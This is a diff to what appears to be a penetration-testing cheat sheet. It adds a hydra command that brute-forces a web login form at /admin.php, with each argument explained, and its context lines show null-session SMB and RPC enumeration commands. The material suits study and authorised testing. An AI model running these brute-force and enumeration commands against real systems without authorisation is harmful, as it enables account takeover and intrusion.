@@ -99,6 +99,14 @@
 	3. smbclient //MOUNT/share -I target -N
 	4. rpcclient -U "" target
 	5. enum4linux target
+	
+# POST form bruteforce using hydra
+
+	1. hydra -vV -L fileList.txt -p randomPassword 192.168.1.3 http-post-form '/admin.php:log=^USER^&pwd=^PASS^&submit=Log+In:F=Invalid username'
+		/admin.php : Location of the post form
+		log=^USER^&pwd=^PASS^&submit=Log+In  : POST parameters
+		F=Invalid username  : Ignore all the responses when the response text contain this 'Invalid username' string
+
 
 # Uploading files using curl when PUT enabled
 
